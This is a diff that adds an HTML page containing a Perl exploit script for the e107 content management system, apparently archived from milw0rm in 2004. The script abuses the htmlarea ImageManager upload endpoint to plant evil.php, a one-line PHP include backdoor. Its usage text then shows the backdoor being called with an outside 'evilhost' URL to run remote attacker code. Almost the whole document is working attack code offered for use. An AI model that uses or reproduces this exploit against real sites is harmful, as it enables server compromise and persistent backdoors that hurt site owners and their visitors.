@@ -1,0 +1,126 @@
+<html><head><title>e107 include() Remote Exploit</title></head><pre>####################################################################
+#
+#  _____ _
+# |  ___| | _____      ___
+# | |_  | |/ _ \ \ /\ / /
+# |  _| | | (_) \ V  V /
+# |_|   |_|\___/ \_/\_/
+#      Security Group.
+#
+#                    -=[ e107 remote sploit ]=-                           
+#                           by sysbug 
+#                              
+# Attack method:                                                               
+# with this sploit u can send an include() vuln to a Host victim  
+# the upload go to /images/evil.php
+#                                                                
+# C:\Perl\bin&gt;perl sploit.pl www.site.com                          
+# -=[ e107 remote sploit ]=-                                      
+#         by sysbug 
+# # www.site.com
+# # OWNED OH YEAH!                                                
+# # get your evilc0de in:                                          
+# # www.site.com/images/evil.php?owned=http://evilhost/ 
+# C:\Perl\bin&gt;                                                     
+# 
+# credits: ALL MY FRIENDS!                                                                 
+# HELP ? RTFM -&gt; perl sploit.pl                                                                
+#####################################################################
+use IO::Socket;
+
+if(@ARGV &lt; 1){
+usage();
+exit;
+}
+main();
+
+sub main(){
+
+print &quot;-=[ e107 remote sploit ]=-\n&quot;;
+print &quot;        by sysbug       \n\n&quot;;
+$host[0] = $ARGV[0];
+if($host[0] =~ /\//){
+($host[1],$host[2])=split(/\//,$host[0]);
+$host[0] =~ /\/(.*)/;
+$host[3] = &quot;/&quot;;
+$host[3] .= $1;
+}
+$host[1] = $host[0] if(!$host[1]);
+@handlers =(&quot;e107_handlers&quot;,&quot;handlers&quot;);
+print &quot;# $host[1]\n&quot;;
+foreach $handler(@handlers){
+$path = &quot;$host[3]/$handler/htmlarea/popups/ImageManager/images.php&quot;;
+$socket=IO::Socket::INET-&gt;new(Proto=&gt;'tcp',PeerAddr=&gt;$host[1],PeerPort=&gt;80,Timeout=&gt;10)|| die &quot;  s0k off\n&quot;;
+print $socket &quot;POST $path HTTP/1.1\r\n&quot;;
+print $socket &quot;Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n&quot;;
+print $socket &quot;Referer: http://www.lapropinacultural.com.ar/handlers/htmlarea/popups/insert_image.php\r\n&quot;;
+print $socket &quot;Accept-Language: pt\r\n&quot;;
+print $socket &quot;Content-Type: multipart/form-data; boundary=---------------------------7d410e113f8\r\n&quot;;
+print $socket &quot;Accept-Encoding: gzip, deflate\r\n&quot;;
+print $socket &quot;User-Agent: l33t br0ws3r\r\n&quot;;
+print $socket &quot;Host: $host[1]\r\n&quot;;
+print $socket &quot;Content-Length: 1646\r\n&quot;;
+print $socket &quot;Connection: Keep-Alive\r\n\r\n&quot;;
+print $socket &quot;-----------------------------7d410e113f8\r\n&quot;;
+print $socket &quot;Content-Disposition: form-data; name=\&quot;dirPath\&quot;\r\n\r\n&quot;;
+print $socket &quot;/\r\n&quot;;
+print $socket &quot;-----------------------------7d410e113f8\r\n&quot;;
+print $socket &quot;Content-Disposition: form-data; name=\&quot;url\&quot;\r\n\r\n\r\n&quot;;
+print $socket &quot;-----------------------------7d410e113f8\r\n&quot;;
+print $socket &quot;Content-Disposition: form-data; name=\&quot;width\&quot;\r\n\r\n\r\n&quot;;
+print $socket &quot;-----------------------------7d410e113f8\r\n&quot;;
+print $socket &quot;Content-Disposition: form-data; name=\&quot;vert\&quot;\r\n\r\n\r\n&quot;;
+print $socket &quot;-----------------------------7d410e113f8\r\n&quot;;
+print $socket &quot;Content-Disposition: form-data; name=\&quot;alt\&quot;\r\n\r\n\r\n&quot;;
+print $socket &quot;-----------------------------7d410e113f8\r\n&quot;;
+print $socket &quot;Content-Disposition: form-data; name=\&quot;height\&quot;\r\n\r\n\r\n&quot;;
+print $socket &quot;-----------------------------7d410e113f8\r\n&quot;;
+print $socket &quot;Content-Disposition: form-data; name=\&quot;horiz\&quot;\r\n\r\n\r\n&quot;;
+print $socket &quot;-----------------------------7d410e113f8\r\n&quot;;
+print $socket &quot;Content-Disposition: form-data; name=\&quot;upload\&quot;; filename=\&quot;evil.php\&quot;\r\n&quot;;
+print $socket &quot;Content-Type: application/octet-stream\r\n\r\n&quot;;
+print $socket &quot;&lt;? include(\$owned); ?&gt;\r\n&quot;;
+print $socket &quot;-----------------------------7d410e113f8\r\n&quot;;
+print $socket &quot;Content-Disposition: form-data; name=\&quot;align\&quot;\r\n\r\n&quot;;
+print $socket &quot;baseline\r\n&quot;;
+print $socket &quot;-----------------------------7d410e113f8\r\n&quot;;
+print $socket &quot;Content-Disposition: form-data; name=\&quot;border\&quot;\r\n\r\n\r\n&quot;;
+print $socket &quot;-----------------------------7d410e113f8\r\n&quot;;
+print $socket &quot;Content-Disposition: form-data; name=\&quot;orginal_width\&quot;\r\n\r\n\r\n&quot;;
+print $socket &quot;-----------------------------7d410e113f8\r\n&quot;;
+print $socket &quot;Content-Disposition: form-data; name=\&quot;orginal_height\&quot;\r\n\r\n\r\n&quot;;
+print $socket &quot;-----------------------------7d410e113f8\r\n&quot;;
+print $socket &quot;Content-Disposition: form-data; name=\&quot;constrain_prop\&quot;\r\n\r\n&quot;;
+print $socket &quot;on\r\n&quot;;
+print $socket &quot;-----------------------------7d410e113f8\r\n&quot;;
+print $socket &quot;Content-Disposition: form-data; name=\&quot;ok\&quot;\r\n\r\n&quot;;
+print $socket &quot;Refresh\r\n&quot;;
+print $socket &quot;-----------------------------7d410e113f8\r\n&quot;;
+print $socket &quot;Content-Disposition: form-data; name=\&quot;ok\&quot;\r\n\r\n&quot;;
+print $socket &quot;OK\r\n&quot;;
+print $socket &quot;-----------------------------7d410e113f8\r\n&quot;;
+print $socket &quot;Content-Disposition: form-data; name=\&quot;cancel\&quot;\r\n\r\n&quot;;
+print $socket &quot;Cancel\r\n&quot;;
+print $socket &quot;-----------------------------7d410e113f8--\r\n\r\n\r\n\r\n&quot;;
+@socket = &lt;$socket&gt;;
+foreach $teste(@socket){
+if($teste=~ /&lt;title&gt;Image Browser&lt;\/title&gt;/){
+print &quot;# OWNED OH YEAH!\n&quot;;
+print &quot;# get your evilc0de in: \n# $host[0]/images/evil.php?owned=http://evilhost/\n&quot;;
+$result = 1;
+}
+}
+close($socket);
+}
+if($result){
+exit;
+}
+print &quot;# b4d upload!!&quot;;
+}
+sub usage(){
+print &quot;-=[ e107 remote sploit ]=-\n&quot;;
+print &quot;        by sysbug       \n\n&quot;;
+print &quot;# usage: perl $0 &lt;host&gt; \n&quot;;
+}
+
+# milw0rm.com [2004-12-22]</pre></html>
